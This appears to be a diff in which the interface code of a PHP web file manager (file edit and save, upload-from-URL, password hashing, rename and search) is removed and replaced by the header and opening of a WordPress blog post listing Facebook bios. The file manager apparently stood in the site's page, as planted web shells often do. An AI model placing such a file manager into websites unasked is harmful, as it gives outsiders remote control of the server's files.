-        a, a:hover, a:visited, a:focus { text-decoration:none !important; }
-        .filename, td, th { white-space:nowrap  }
-        .navbar-brand { font-weight:bold; }
-        .nav-item.avatar a { cursor:pointer;text-transform:capitalize; }
-        .nav-item.avatar a > i { font-size:15px; }
-        .nav-item.avatar .dropdown-menu a { font-size:13px; }
-        #search-addon { font-size:12px;border-right-width:0; }
-        .brl-0 { background:transparent;border-left:0; border-top-left-radius: 0; border-bottom-left-radius: 0; }
-        .brr-0 { border-top-right-radius: 0; border-bottom-right-radius: 0; }
-        .bread-crumb { color:#cccccc;font-style:normal; }
-        #main-table { transition: transform .25s cubic-bezier(0.4, 0.5, 0, 1),width 0s .25s;}
-        #main-table .filename a { color:#222222; }
-        .table td, .table th { vertical-align:middle !important; }
-        .table .custom-checkbox-td .custom-control.custom-checkbox, .table .custom-checkbox-header .custom-control.custom-checkbox { min-width:18px; display: flex;align-items: center; justify-content: center; }
-        .table-sm td, .table-sm th { padding:.4rem; }
-        .table-bordered td, .table-bordered th { border:1px solid #f1f1f1; }
-        .hidden { display:none  }
-        pre.with-hljs { padding:0; overflow: hidden;  }
-        pre.with-hljs code { margin:0;border:0;overflow:scroll;  }
-        code.maxheight, pre.maxheight { max-height:512px  }
-        .fa.fa-caret-right { font-size:1.2em;margin:0 4px;vertical-align:middle;color:#ececec  }
-        .fa.fa-home { font-size:1.3em;vertical-align:bottom  }
-        .path { margin-bottom:10px  }
-        form.dropzone { min-height:200px;border:2px dashed #007bff;line-height:6rem; }
-        .right { text-align:right  }
-        .center, .close, .login-form, .preview-img-container { text-align:center  }
-        .message { padding:4px 7px;border:1px solid #ddd;background-color:#fff  }
-        .message.ok { border-color:green;color:green  }
-        .message.error { border-color:red;color:red  }
-        .message.alert { border-color:orange;color:orange  }
-        .preview-img { max-width:100%;max-height:80vh;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAKklEQVR42mL5//8/Azbw+PFjrOJMDCSCUQ3EABZc4S0rKzsaSvTTABBgAMyfCMsY4B9iAAAAAElFTkSuQmCC);cursor:zoom-in }
-        input#preview-img-zoomCheck[type=checkbox] { display:none }
-        input#preview-img-zoomCheck[type=checkbox]:checked ~ label > img { max-width:none;max-height:none;cursor:zoom-out }
-        .inline-actions > a > i { font-size:1em;margin-left:5px;background:#3785c1;color:#fff;padding:3px 4px;border-radius:3px; }
-        .preview-video { position:relative;max-width:100%;height:0;padding-bottom:62.5%;margin-bottom:10px  }
-        .preview-video video { position:absolute;width:100%;height:100%;left:0;top:0;background:#000  }
-        .compact-table { border:0;width:auto  }
-        .compact-table td, .compact-table th { width:100px;border:0;text-align:center  }
-        .compact-table tr:hover td { background-color:#fff  }
-        .filename { max-width:420px;overflow:hidden;text-overflow:ellipsis  }
-        .break-word { word-wrap:break-word;margin-left:30px  }
-        .break-word.float-left a { color:#7d7d7d  }
-        .break-word + .float-right { padding-right:30px;position:relative  }
-        .break-word + .float-right > a { color:#7d7d7d;font-size:1.2em;margin-right:4px  }
-        #editor { position:absolute;right:15px;top:100px;bottom:15px;left:15px  }
-        @media (max-width:481px) {
-            #editor { top:150px; }
-        }
-        #normal-editor { border-radius:3px;border-width:2px;padding:10px;outline:none; }
-        .btn-2 { padding:4px 10px;font-size:small; }
-        li.file:before,li.folder:before { font:normal normal normal 14px/1 FontAwesome;content:"\f016";margin-right:5px }
-        li.folder:before { content:"\f114" }
-        i.fa.fa-folder-o { color:#0157b3 }
-        i.fa.fa-picture-o { color:#26b99a }
-        i.fa.fa-file-archive-o { color:#da7d7d }
-        .btn-2 i.fa.fa-file-archive-o { color:inherit }
-        i.fa.fa-css3 { color:#f36fa0 }
-        i.fa.fa-file-code-o { color:#007bff }
-        i.fa.fa-code { color:#cc4b4c }
-        i.fa.fa-file-text-o { color:#0096e6 }
-        i.fa.fa-html5 { color:#d75e72 }
-        i.fa.fa-file-excel-o { color:#09c55d }
-        i.fa.fa-file-powerpoint-o { color:#f6712e }
-        i.go-back { font-size:1.2em;color:#007bff; }
-        .main-nav { padding:0.2rem 1rem;box-shadow:0 4px 5px 0 rgba(0, 0, 0, .14), 0 1px 10px 0 rgba(0, 0, 0, .12), 0 2px 4px -1px rgba(0, 0, 0, .2)  }
-        .dataTables_filter { display:none; }
-        table.dataTable thead .sorting { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAQAAADYWf5HAAAAkElEQVQoz7XQMQ5AQBCF4dWQSJxC5wwax1Cq1e7BAdxD5SL+Tq/QCM1oNiJidwox0355mXnG/DrEtIQ6azioNZQxI0ykPhTQIwhCR+BmBYtlK7kLJYwWCcJA9M4qdrZrd8pPjZWPtOqdRQy320YSV17OatFC4euts6z39GYMKRPCTKY9UnPQ6P+GtMRfGtPnBCiqhAeJPmkqAAAAAElFTkSuQmCC'); }
-        table.dataTable thead .sorting_asc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZ0lEQVQ4y2NgGLKgquEuFxBPAGI2ahhWCsS/gDibUoO0gPgxEP8H4ttArEyuQYxAPBdqEAxPBImTY5gjEL9DM+wTENuQahAvEO9DMwiGdwAxOymGJQLxTyD+jgWDxCMZRsEoGAVoAADeemwtPcZI2wAAAABJRU5ErkJggg=='); }
-        table.dataTable thead .sorting_desc { cursor:pointer;background-repeat:no-repeat;background-position:center right;background-image:url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAATCAYAAAByUDbMAAAAZUlEQVQ4y2NgGAWjYBSggaqGu5FA/BOIv2PBIPFEUgxjB+IdQPwfC94HxLykus4GiD+hGfQOiB3J8SojEE9EM2wuSJzcsFMG4ttQgx4DsRalkZENxL+AuJQaMcsGxBOAmGvopk8AVz1sLZgg0bsAAAAASUVORK5CYII='); }
-        table.dataTable thead tr:first-child th.custom-checkbox-header:first-child { background-image:none; }
-        .footer-action li { margin-bottom:10px; }
-        .app-v-title { font-size:24px;font-weight:300;letter-spacing:-.5px;text-transform:uppercase; }
-        hr.custom-hr { border-top:1px dashed #8c8b8b;border-bottom:1px dashed #fff; }
-        #snackbar { visibility:hidden;min-width:250px;margin-left:-125px;background-color:#333;color:#fff;text-align:center;border-radius:2px;padding:16px;position:fixed;z-index:1;left:50%;bottom:30px;font-size:17px; }
-        #snackbar.show { visibility:visible;-webkit-animation:fadein 0.5s, fadeout 0.5s 2.5s;animation:fadein 0.5s, fadeout 0.5s 2.5s; }
-        @-webkit-keyframes fadein { from { bottom:0;opacity:0; }
-        to { bottom:30px;opacity:1; }
-        }
-        @keyframes fadein { from { bottom:0;opacity:0; }
-        to { bottom:30px;opacity:1; }
-        }
-        @-webkit-keyframes fadeout { from { bottom:30px;opacity:1; }
-        to { bottom:0;opacity:0; }
-        }
-        @keyframes fadeout { from { bottom:30px;opacity:1; }
-        to { bottom:0;opacity:0; }
-        }
-        #main-table span.badge { border-bottom:2px solid #f8f9fa }
-        #main-table span.badge:nth-child(1) { border-color:#df4227 }
-        #main-table span.badge:nth-child(2) { border-color:#f8b600 }
-        #main-table span.badge:nth-child(3) { border-color:#00bd60 }
-        #main-table span.badge:nth-child(4) { border-color:#4581ff }
-        #main-table span.badge:nth-child(5) { border-color:#ac68fc }
-        #main-table span.badge:nth-child(6) { border-color:#45c3d2 }
-        @media only screen and (min-device-width:768px) and (max-device-width:1024px) and (orientation:landscape) and (-webkit-min-device-pixel-ratio:2) { .navbar-collapse .col-xs-6 { padding:0; }
-        }
-        .btn.active.focus,.btn.active:focus,.btn.focus,.btn.focus:active,.btn:active:focus,.btn:focus { outline:0!important;outline-offset:0!important;background-image:none!important;-webkit-box-shadow:none!important;box-shadow:none!important }
-        .lds-facebook { display:none;position:relative;width:64px;height:64px }
-        .lds-facebook div,.lds-facebook.show-me { display:inline-block }
-        .lds-facebook div { position:absolute;left:6px;width:13px;background:#007bff;animation:lds-facebook 1.2s cubic-bezier(0,.5,.5,1) infinite }
-        .lds-facebook div:nth-child(1) { left:6px;animation-delay:-.24s }
-        .lds-facebook div:nth-child(2) { left:26px;animation-delay:-.12s }
-        .lds-facebook div:nth-child(3) { left:45px;animation-delay:0s }
-        @keyframes lds-facebook { 0% { top:6px;height:51px }
-        100%,50% { top:19px;height:26px }
-        }
-        ul#search-wrapper { padding-left: 0;border: 1px solid #ecececcc; } ul#search-wrapper li { list-style: none; padding: 5px;border-bottom: 1px solid #ecececcc; }
-        ul#search-wrapper li:nth-child(odd){ background: #f9f9f9cc;}
-        .c-preview-img { max-width: 300px; }
-        .border-radius-0 { border-radius: 0; }
-        .float-right { float: right; }
-        .table-hover>tbody>tr:hover>td:first-child { border-left: 1px solid #1b77fd; }
-        #main-table tr.even { background-color: #F8F9Fa; }
-        .filename>a>i {margin-right: 3px;}
-    </style>
-    <?php
-    if (FM_THEME == "dark"): ?>
-        <style>
-            :root {
-                --bs-bg-opacity: 1;
-                --bg-color: #f3daa6;
-                --bs-dark-rgb: 28, 36, 41 !important;
-                --bs-bg-opacity: 1;
-            }
-            .table-dark { --bs-table-bg: 28, 36, 41 !important; }
-            .btn-primary { --bs-btn-bg: #26566c; --bs-btn-border-color: #26566c; }
-            body.theme-dark { background-image: linear-gradient(90deg, #1c2429, #263238); color: #CFD8DC; }
-            .list-group .list-group-item { background: #343a40; }
-            .theme-dark .navbar-nav i, .navbar-nav .dropdown-toggle, .break-word { color: #CFD8DC; }
-            a, a:hover, a:visited, a:active, #main-table .filename a, i.fa.fa-folder-o, i.go-back { color: var(--bg-color); }
-            ul#search-wrapper li:nth-child(odd) { background: #212a2f; }
-            .theme-dark .btn-outline-primary { color: #b8e59c; border-color: #b8e59c; }
-            .theme-dark .btn-outline-primary:hover, .theme-dark .btn-outline-primary:active { background-color: #2d4121;}
-            .theme-dark input.form-control { background-color: #101518; color: #CFD8DC; }
-            .theme-dark .dropzone { background: transparent; }
-            .theme-dark .inline-actions > a > i { background: #79755e; }
-            .theme-dark .text-white { color: #CFD8DC !important; }
-            .theme-dark .table-bordered td, .table-bordered th { border-color: #343434; }
-            .theme-dark .table-bordered td .custom-control-input, .theme-dark .table-bordered th .custom-control-input { opacity: 0.678; }
-            .message { background-color: #212529; }
-            .compact-table tr:hover td { background-color: #3d3d3d; }
-            #main-table tr.even { background-color: #21292f; }
-            form.dropzone { border-color: #79755e; }
-        </style>
-    <?php endif; ?>
-</head>
-<body class="<?php echo (FM_THEME == "dark") ? 'theme-dark' : ''; ?> <?php echo $isStickyNavBar; ?>">
-<div id="wrapper" class="container-fluid">
-    <!-- New Item creation -->
-    <div class="modal fade" id="createNewItem" tabindex="-1" role="dialog" data-bs-backdrop="static" data-bs-keyboard="false" aria-labelledby="newItemModalLabel" aria-hidden="true">
-        <div class="modal-dialog" role="document">
-            <form class="modal-content <?php echo fm_get_theme(); ?>" method="post">
-                <div class="modal-header">
-                    <h5 class="modal-title" id="newItemModalLabel"><i class="fa fa-plus-square fa-fw"></i><?php echo lng('CreateNewItem') ?></h5>
-                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-                </div>
-                <div class="modal-body">
-                    <p><label for="newfile"><?php echo lng('ItemType') ?> </label></p>
-                    <div class="form-check form-check-inline">
-                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline1" name="newfile" value="file">
-                      <label class="form-check-label" for="customRadioInline1"><?php echo lng('File') ?></label>
-                    </div>
-                    <div class="form-check form-check-inline">
-                      <input class="form-check-input" type="radio" name="newfile" id="customRadioInline2" value="folder" checked>
-                      <label class="form-check-label" for="customRadioInline2"><?php echo lng('Folder') ?></label>
-                    </div>
-
-                    <p class="mt-3"><label for="newfilename"><?php echo lng('ItemName') ?> </label></p>
-                    <input type="text" name="newfilename" id="newfilename" value="" class="form-control" placeholder="<?php echo lng('Enter here...') ?>" required>
-                </div>
-                <div class="modal-footer">
-                    <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                    <button type="button" class="btn btn-outline-primary" data-bs-dismiss="modal"><i class="fa fa-times-circle"></i> <?php echo lng('Cancel') ?></button>
-                    <button type="submit" class="btn btn-success"><i class="fa fa-check-circle"></i> <?php echo lng('CreateNow') ?></button>
-                </div>
-            </form>
-        </div>
-    </div>
-
-    <!-- Advance Search Modal -->
-    <div class="modal fade" id="searchModal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
-      <div class="modal-dialog modal-lg" role="document">
-        <div class="modal-content <?php echo fm_get_theme(); ?>">
-          <div class="modal-header">
-            <h5 class="modal-title col-10" id="searchModalLabel">
-                <div class="input-group mb-3">
-                  <input type="text" class="form-control" placeholder="<?php echo lng('Search') ?> <?php echo lng('a files') ?>" aria-label="<?php echo lng('Search') ?>" aria-describedby="search-addon3" id="advanced-search" autofocus required>
-                  <span class="input-group-text" id="search-addon3"><i class="fa fa-search"></i></span>
-                </div>
-            </h5>
-            <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
-          </div>
-          <div class="modal-body">
-            <form action="" method="post">
-                <div class="lds-facebook"><div></div><div></div><div></div></div>
-                <ul id="search-wrapper">
-                    <p class="m-2"><?php echo lng('Search file in folder and subfolders...') ?></p>
-                </ul>
-            </form>
-          </div>
-        </div>
-      </div>
-    </div>
-
-    <!--Rename Modal -->
-    <div class="modal modal-alert" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="renameDailog">
-      <div class="modal-dialog" role="document">
-        <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" autocomplete="off">
-          <div class="modal-body p-4 text-center">
-            <h5 class="mb-3"><?php echo lng('Are you sure want to rename?') ?></h5>
-            <p class="mb-1">
-                <input type="text" name="rename_to" id="js-rename-to" class="form-control" placeholder="<?php echo lng('Enter new file name') ?>" required>
-                <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                <input type="hidden" name="rename_from" id="js-rename-from">
-            </p>
-          </div>
-          <div class="modal-footer flex-nowrap p-0">
-            <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
-            <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0"><strong><?php echo lng('Okay') ?></strong></button>
-          </div>
-        </form>
-      </div>
-    </div>
-
-    <!-- Confirm Modal -->
-    <script type="text/html" id="js-tpl-confirm">
-        <div class="modal modal-alert confirmDailog" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" role="dialog" id="confirmDailog-<%this.id%>">
-          <div class="modal-dialog" role="document">
-            <form class="modal-content rounded-3 shadow <?php echo fm_get_theme(); ?>" method="post" autocomplete="off" action="<%this.action%>">
-              <div class="modal-body p-4 text-center">
-                <h5 class="mb-2"><?php echo lng('Are you sure want to') ?> <%this.title%> ?</h5>
-                <p class="mb-1"><%this.content%></p>
-              </div>
-              <div class="modal-footer flex-nowrap p-0">
-                <button type="button" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0 border-end" data-bs-dismiss="modal"><?php echo lng('Cancel') ?></button>
-                <input type="hidden" name="token" value="<?php echo $_SESSION['token']; ?>">
-                <button type="submit" class="btn btn-lg btn-link fs-6 text-decoration-none col-6 m-0 rounded-0" data-bs-dismiss="modal"><strong><?php echo lng('Okay') ?></strong></button>
-              </div>
-            </form>
-          </div>
-        </div>
-    </script>
-
-    <?php
-    }
-
-    /**
-     * Show page footer after login
-     */
-    function fm_show_footer()
-    {
-    ?>
+				</div>
+			</div>
+					</div>
+	</div>
+	
+<div id="mobile-header" class="site-mobile-header-wrap">
+	<div class="site-header-inner-wrap">
+		<div class="site-header-upper-wrap">
+			<div class="site-header-upper-inner-wrap">
+			<div class="site-main-header-wrap site-header-focus-item site-header-row-layout-standard site-header-row-tablet-layout-default site-header-row-mobile-layout-default ">
+	<div class="site-header-row-container-inner">
+		<div class="site-container">
+			<div class="site-main-header-inner-wrap site-header-row site-header-row-has-sides site-header-row-center-column">
+									<div class="site-header-main-section-left site-header-section site-header-section-left">
+						<div class="site-header-item site-header-focus-item site-header-item-navgation-popup-toggle" data-section="kadence_customizer_mobile_trigger">
+		<div class="mobile-toggle-open-container">
+						<button id="mobile-toggle" class="menu-toggle-open drawer-toggle menu-toggle-style-default" aria-label="Open menu" data-toggle-target="#mobile-drawer" data-toggle-body-class="showing-popup-drawer-from-left" aria-expanded="false" data-set-focus=".menu-toggle-close"
+					>
+						<span class="menu-toggle-icon"><span class="kadence-svg-iconset"><svg class="kadence-svg-icon kadence-menu2-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="24" height="28" viewBox="0 0 24 28"><title>Toggle Menu</title><path d="M24 21v2c0 0.547-0.453 1-1 1h-22c-0.547 0-1-0.453-1-1v-2c0-0.547 0.453-1 1-1h22c0.547 0 1 0.453 1 1zM24 13v2c0 0.547-0.453 1-1 1h-22c-0.547 0-1-0.453-1-1v-2c0-0.547 0.453-1 1-1h22c0.547 0 1 0.453 1 1zM24 5v2c0 0.547-0.453 1-1 1h-22c-0.547 0-1-0.453-1-1v-2c0-0.547 0.453-1 1-1h22c0.547 0 1 0.453 1 1z"></path>
+				</svg></span></span>
+		</button>
+	</div>
+	</div><!-- data-section="mobile_trigger" -->
+					</div>
+													<div class="site-header-main-section-center site-header-section site-header-section-center">
+						<div class="site-header-item site-header-focus-item" data-section="title_tagline">
+	<div class="site-branding mobile-site-branding branding-layout-standard branding-tablet-layout-inherit site-brand-logo-only branding-mobile-layout-inherit"><a class="brand has-logo-image" href="https://socialfunda.net/" rel="home" data-wpel-link="internal"><img width="319" height="116" src="https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3.webp" class="custom-logo" alt="Social Funda" decoding="async" srcset="https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3.webp 319w, https://socialfunda.net/wp-content/uploads/2023/02/cropped-socialfunda-3-300x109.webp 300w" sizes="(max-width: 319px) 100vw, 319px" /></a></div></div><!-- data-section="title_tagline" -->
+					</div>
+													<div class="site-header-main-section-right site-header-section site-header-section-right">
+						<div class="site-header-item site-header-focus-item" data-section="kadence_customizer_header_search">
+		<div class="search-toggle-open-container">
+						<button class="search-toggle-open drawer-toggle search-toggle-style-bordered" aria-label="View Search Form" data-toggle-target="#search-drawer" data-toggle-body-class="showing-popup-drawer-from-full" aria-expanded="false" data-set-focus="#search-drawer .search-field"
+					>
+						<span class="search-toggle-icon"><span class="kadence-svg-iconset"><svg aria-hidden="true" class="kadence-svg-icon kadence-search-svg" fill="currentColor" version="1.1" xmlns="http://www.w3.org/2000/svg" width="26" height="28" viewBox="0 0 26 28"><title>Search</title><path d="M18 13c0-3.859-3.141-7-7-7s-7 3.141-7 7 3.141 7 7 7 7-3.141 7-7zM26 26c0 1.094-0.906 2-2 2-0.531 0-1.047-0.219-1.406-0.594l-5.359-5.344c-1.828 1.266-4.016 1.937-6.234 1.937-6.078 0-11-4.922-11-11s4.922-11 11-11 11 4.922 11 11c0 2.219-0.672 4.406-1.937 6.234l5.359 5.359c0.359 0.359 0.578 0.875 0.578 1.406z"></path>
+				</svg></span></span>
+		</button>
+	</div>
+	</div><!-- data-section="header_search" -->
+					</div>
+							</div>
+		</div>
+	</div>
 </div>
-<?php print_external('js-jquery'); ?>
-<?php print_external('js-bootstrap'); ?>
-<?php print_external('js-jquery-datatables'); ?>
-<?php if (FM_USE_HIGHLIGHTJS && isset($_GET['view'])): ?>
-    <?php print_external('js-highlightjs'); ?>
-    <script>hljs.highlightAll(); var isHighlightingEnabled = true;</script>
-<?php endif; ?>
-<script>
-    function template(html,options){
-        var re=/<\%([^\%>]+)?\%>/g,reExp=/(^( )?(if|for|else|switch|case|break|{|}))(.*)?/g,code='var r=[];\n',cursor=0,match;var add=function(line,js){js?(code+=line.match(reExp)?line+'\n':'r.push('+line+');\n'):(code+=line!=''?'r.push("'+line.replace(/"/g,'\\"')+'");\n':'');return add}
-        while(match=re.exec(html)){add(html.slice(cursor,match.index))(match[1],!0);cursor=match.index+match[0].length}
-        add(html.substr(cursor,html.length-cursor));code+='return r.join("");';return new Function(code.replace(/[\r\t\n]/g,'')).apply(options)
-    }
-    function rename(e, t) { if(t) { $("#js-rename-from").val(t);$("#js-rename-to").val(t); $("#renameDailog").modal('show'); } }
-    function change_checkboxes(e, t) { for (var n = e.length - 1; n >= 0; n--) e[n].checked = "boolean" == typeof t ? t : !e[n].checked }
-    function get_checkboxes() { for (var e = document.getElementsByName("file[]"), t = [], n = e.length - 1; n >= 0; n--) (e[n].type = "checkbox") && t.push(e[n]); return t }
-    function select_all() { change_checkboxes(get_checkboxes(), !0) }
-    function unselect_all() { change_checkboxes(get_checkboxes(), !1) }
-    function invert_all() { change_checkboxes(get_checkboxes()) }
-    function checkbox_toggle() { var e = get_checkboxes(); e.push(this), change_checkboxes(e) }
-    function backup(e, t) { // Create file backup with .bck
-        var n = new XMLHttpRequest,
-            a = "path=" + e + "&file=" + t + "&token="+ window.csrf +"&type=backup&ajax=true";
-        return n.open("POST", "", !0), n.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), n.onreadystatechange = function () {
-            4 == n.readyState && 200 == n.status && toast(n.responseText)
-        }, n.send(a), !1
-    }
-    // Toast message
-    function toast(txt) { var x = document.getElementById("snackbar");x.innerHTML=txt;x.className = "show";setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000); }
-    // Save file
-    function edit_save(e, t) {
-        var n = "ace" == t ? editor.getSession().getValue() : document.getElementById("normal-editor").value;
-        if (typeof n !== 'undefined' && n !== null) {
-            if (true) {
-                var data = {ajax: true, content: n, type: 'save', token: window.csrf};
+			</div>
+		</div>
+			</div>
+</div>
+</header><!-- #masthead -->
 
-                $.ajax({
-                    type: "POST",
-                    url: window.location,
-                    data: JSON.stringify(data),
-                    contentType: "application/json; charset=utf-8",
-                    success: function(mes){toast("Saved Successfully"); window.onbeforeunload = function() {return}},
-                    failure: function(mes) {toast("Error: try again");},
-                    error: function(mes) {toast(`<p style="background-color:red">${mes.responseText}</p>`);}
-                });
-            } else {
-                var a = document.createElement("form");
-                a.setAttribute("method", "POST"), a.setAttribute("action", "");
-                var o = document.createElement("textarea");
-                o.setAttribute("type", "textarea"), o.setAttribute("name", "savedata");
-                let cx = document.createElement("input"); cx.setAttribute("type", "hidden");cx.setAttribute("name", "token");cx.setAttribute("value", window.csrf);
-                var c = document.createTextNode(n);
-                o.appendChild(c), a.appendChild(o), a.appendChild(cx), document.body.appendChild(a), a.submit()
-            }
-        }
-    }
-    function show_new_pwd() { $(".js-new-pwd").toggleClass('hidden'); }
-    // Save Settings
-    function save_settings($this) {
-        let form = $($this);
-        $.ajax({
-            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
-            success: function (data) {if(data) { window.location.reload();}}
-        }); return false;
-    }
-    //Create new password hash
-    function new_password_hash($this) {
-        let form = $($this), $pwd = $("#js-pwd-result"); $pwd.val('');
-        $.ajax({
-            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
-            success: function (data) { if(data) { $pwd.val(data); } }
-        }); return false;
-    }
-    // Upload files using URL @param {Object}
-    function upload_from_url($this) {
-        let form = $($this), resultWrapper = $("div#js-url-upload__list");
-        $.ajax({
-            type: form.attr('method'), url: form.attr('action'), data: form.serialize()+"&token="+ window.csrf +"&ajax="+true,
-            beforeSend: function() { form.find("input[name=uploadurl]").attr("disabled","disabled"); form.find("button").hide(); form.find(".lds-facebook").addClass('show-me'); },
-            success: function (data) {
-                if(data) {
-                    data = JSON.parse(data);
-                    if(data.done) {
-                        resultWrapper.append('<div class="alert alert-success row">Uploaded Successful: '+data.done.name+'</div>'); form.find("input[name=uploadurl]").val('');
-                    } else if(data['fail']) { resultWrapper.append('<div class="alert alert-danger row">Error: '+data.fail.message+'</div>'); }
-                    form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');
-                }
-            },
-            error: function(xhr) {
-                form.find("input[name=uploadurl]").removeAttr("disabled");form.find("button").show();form.find(".lds-facebook").removeClass('show-me');console.error(xhr);
-            }
-        }); return false;
-    }
-    // Search template
-    function search_template(data) {
-        var response = "";
-        $.each(data, function (key, val) {
-            response += `<li><a href="?p=${val.path}&view=${val.name}">${val.path}/${val.name}</a></li>`;
-        });
-        return response;
-    }
-    // Advance search
-    function fm_search() {
-        var searchTxt = $("input#advanced-search").val(), searchWrapper = $("ul#search-wrapper"), path = $("#js-search-modal").attr("href"), _html = "", $loader = $("div.lds-facebook");
-        if(!!searchTxt && searchTxt.length > 2 && path) {
-            var data = {ajax: true, content: searchTxt, path:path, type: 'search', token: window.csrf };
-            $.ajax({
-                type: "POST",
-                url: window.location,
-                data: data,
-                beforeSend: function() {
-                    searchWrapper.html('');
-                    $loader.addClass('show-me');
-                },
-                success: function(data){
-                    $loader.removeClass('show-me');
-                    data = JSON.parse(data);
-                    if(data && data.length) {
-                        _html = search_template(data);
-                        searchWrapper.html(_html);
-                    } else { searchWrapper.html('<p class="m-2">No result found!<p>'); }
-                },
-                error: function(xhr) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>'); },
-                failure: function(mes) { $loader.removeClass('show-me'); searchWrapper.html('<p class="m-2">ERROR: Try again later!</p>');}
-            });
-        } else { searchWrapper.html("OOPS: minimum 3 characters required!"); }
-    }
+	<div id="inner-wrap" class="wrap hfeed kt-clear">
+		<div id="primary" class="content-area">
+	<div class="content-container site-container">
+		<main id="main" class="site-main" role="main">
+						<div class="content-wrap">
+				<article id="post-76" class="entry content-bg single-entry post-76 post type-post status-publish format-standard has-post-thumbnail hentry category-facebook-bios">
+	<div class="entry-content-wrap">
+		
+<div class="entry-content single-content">
+	<div class="kb-row-layout-wrap kb-row-layout-id76_db69f0-17 alignnone kt-row-has-bg wp-block-kadence-rowlayout"><div class="kt-row-column-wrap kt-has-1-columns kt-row-layout-equal kt-tab-layout-inherit kt-mobile-layout-row kt-row-valign-top">
 
-    // action confirm dailog modal
-    function confirmDailog(e, id = 0, title = "Action", content = "", action = null) {
-        e.preventDefault();
-        const tplObj = {id, title, content: decodeURIComponent(content.replace(/\+/g, ' ')), action};
-        let tpl = $("#js-tpl-confirm").html();
-        $(".modal.confirmDailog").remove();
-        $('#wrapper').append(template(tpl,tplObj));
-        const $confirmDailog = $("#confirmDailog-"+tplObj.id);
-        $confirmDailog.modal('show');
-        return false;
-    }
-    
+<div class="wp-block-kadence-column kadence-column76_ccee7d-12"><div class="kt-inside-inner-col">
+<h1 class="kt-adv-heading76_027392-ef wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_027392-ef"><span class="ez-toc-section" id="800_Facebook_Stylish_Bio_for_Girls_and_Boys_2024"></span>800+ Facebook Stylish Bio for Girls and Boys 2024<span class="ez-toc-section-end"></span></h1>
+</div></div>
 
-    // on mouse hover image preview
-    !function(s){s.previewImage=function(e){var o=s(document),t=".previewImage",a=s.extend({xOffset:20,yOffset:-20,fadeIn:"fast",css:{padding:"5px",border:"1px solid #cccccc","background-color":"#fff"},eventSelector:"[data-preview-image]",dataKey:"previewImage",overlayId:"preview-image-plugin-overlay"},e);return o.off(t),o.on("mouseover"+t,a.eventSelector,function(e){s("p#"+a.overlayId).remove();var o=s("<p>").attr("id",a.overlayId).css("position","absolute").css("display","none").append(s('<img class="c-preview-img">').attr("src",s(this).data(a.dataKey)));a.css&&o.css(a.css),s("body").append(o),o.css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px").fadeIn(a.fadeIn)}),o.on("mouseout"+t,a.eventSelector,function(){s("#"+a.overlayId).remove()}),o.on("mousemove"+t,a.eventSelector,function(e){s("#"+a.overlayId).css("top",e.pageY+a.yOffset+"px").css("left",e.pageX+a.xOffset+"px")}),this},s.previewImage()}(jQuery);
+</div></div>
 
-    // Dom Ready Events
-    $(document).ready( function () {
-        // dataTable init
-        var $table = $('#main-table'),
-            tableLng = $table.find('th').length,
-            _targets = (tableLng && tableLng == 7 ) ? [0, 4,5,6] : tableLng == 5 ? [0,4] : [3];
-            mainTable = $('#main-table').DataTable({paging: false, info: false, order: [], columnDefs: [{targets: _targets, orderable: false}]
-        });
-        // filter table
-        $('#search-addon').on( 'keyup', function () {
-            mainTable.search( this.value ).draw();
-        });
-        $("input#advanced-search").on('keyup', function (e) {
-            if (e.keyCode === 13) { fm_search(); }
-        });
-        $('#search-addon3').on( 'click', function () { fm_search(); });
-        //upload nav tabs
-        $(".fm-upload-wrapper .card-header-tabs").on("click", 'a', function(e){
-            e.preventDefault();let target=$(this).data('target');
-            $(".fm-upload-wrapper .card-header-tabs a").removeClass('active');$(this).addClass('active');
-            $(".fm-upload-wrapper .card-tabs-container").addClass('hidden');$(target).removeClass('hidden');
-        });
-    });
+
+<p class="kt-adv-heading76_05f080-b7 wp-block-kadence-advancedheading" data-kb-block="kb-adv-heading76_05f080-b7">Friends, Are you looking for a stylish Facebook bio to make your Facebook account more stylish and attractive? Congratulations! You are at the right place; you don&#8217;t have any need to search your quarry further. Here you will find the best collection of Facebook stylish bios and more at one place.</p>
+
+
+
